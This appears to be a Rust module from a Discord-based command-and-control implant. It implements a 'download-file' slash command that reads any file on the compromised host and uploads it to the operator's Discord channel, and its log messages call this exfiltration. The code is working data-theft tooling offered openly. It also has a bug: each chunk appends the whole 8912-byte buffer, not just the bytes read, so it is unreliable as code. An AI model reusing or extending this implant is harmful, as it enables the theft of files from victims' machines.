use crate::{
    discord_utils::bot_functions::send_interaction_response, errors::DiscordC2Error,
    os::process_handler::ProcessHandler, session::SHELL_TYPE,
};

use std::{
    borrow::Cow,
    path::{Path, PathBuf},
};

use serenity::{
    builder::CreateApplicationCommand,
    client::Context,
    model::{
        application::{
            command::CommandOptionType,
            interaction::{
                application_command::{
                    ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
                },
            },
        },
        channel::AttachmentType,
    },
};

use tokio::{fs::File, io::AsyncReadExt};

use tracing::{error, info as informational, warn};

pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    command
        .name("download-file")
        .description("Downloads a file from the remote host.")
        .create_option(|option| {
            option
                .name("file-path")
                .kind(CommandOptionType::String)
                .description(
                    "Relative to the working directory of the session, or an absolute path",
                )
                .required(true)
        })
}

pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType<'static>>, DiscordC2Error> {
    let options = options.to_owned();
    let option = options
        .get(0)
        .ok_or_else(|| DiscordC2Error::InvalidInput("Expected download options".to_string()))?
        .resolved
        .clone()
        .ok_or_else(|| DiscordC2Error::InvalidInput("File path option not found.".to_string()))?;

    if let CommandDataOptionValue::String(file_path) = option {
        // Validate the file path and make sure it actually exists
        let path = path_validator(file_path.as_str()).await?;
        let attachment = file_to_attachment(path).await?;

        Ok(Some(attachment))
    } else {
        Ok(None)
    }
}

async fn path_validator(file_path: &str) -> Result<PathBuf, DiscordC2Error> {
    let shell_type = SHELL_TYPE.lock().await;
    let process_handler = match shell_type.as_ref() {
        Some(shell_type) => ProcessHandler::instance(shell_type).await,
        None => Err(DiscordC2Error::InvalidInput(
            "Shell type not found.".to_string(),
        )),
    }?;

    // Should return a DiscordC2Error::RegexError if not successful
    let directory = process_handler.current_working_directory().await?;

    // Path is an absolute path and was found
    if Path::new(file_path).exists() {
        Ok(Path::new(file_path).to_path_buf())
    }
    // Path is relative to the WD of the shell and was found
    else if Path::new(&directory).join(file_path).exists() {
        Ok(Path::new(&directory).join(file_path))
    }
    // Path was not found
    else {
        Err(DiscordC2Error::NotFound(file_path.to_string()))
    }
}

// TODO: Prevent downloading files greater than 100MB
async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static>, DiscordC2Error> {
    let mut file = File::open(&file_path).await?;
    let mut buffer = [0; 8912];

    let _metadata = file.metadata().await?; // use this for size checks

    let mut final_bytes = Vec::new();

    let file_extension = file_path
        .extension()
        .and_then(|ext| ext.to_str())
        .unwrap_or_else(|| {
            warn!("Extension was not found");
            "null"
        });

    let file_name = file_path.file_name().ok_or(DiscordC2Error::InvalidInput(
        "File name not found.".to_string(),
    ));

    //TODO: reading 8kb into the file even if not necessary, this is why size checks are important
    loop {
        let bytes_read = file.read(&mut buffer).await?;
        if bytes_read == 0 {
            break;
        }
        final_bytes.extend_from_slice(&buffer);
    }

    Ok(AttachmentType::Bytes {
        data: Cow::from(final_bytes),
        filename: format!(
            "{}.{}",
            file_name?.to_str().ok_or(DiscordC2Error::InvalidInput(
                "file name couldn't be converted".to_string()
            ))?,
            file_extension
        ),
    })
}

pub async fn download_handler(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
) -> Result<(), DiscordC2Error> {
    let attachment = run(&command.data.options).await;
    
    match attachment {
        Ok(Some(attachment)) => {
            informational!("Successfully exfiltrated the requested file.");
            send_interaction_response(ctx, &command.clone(), "Successfully exfiltrated the file!",Some(attachment)).await?;
        }
        Err(reason) => {
            error!("Failed to exfiltrate the file: {}", reason);
            send_interaction_response(ctx,&command.clone(),format!("Failed to exfiltrate the file: {}", reason),None).await?;
        }
        _ => return Ok(()),
    }
    Ok(())
}
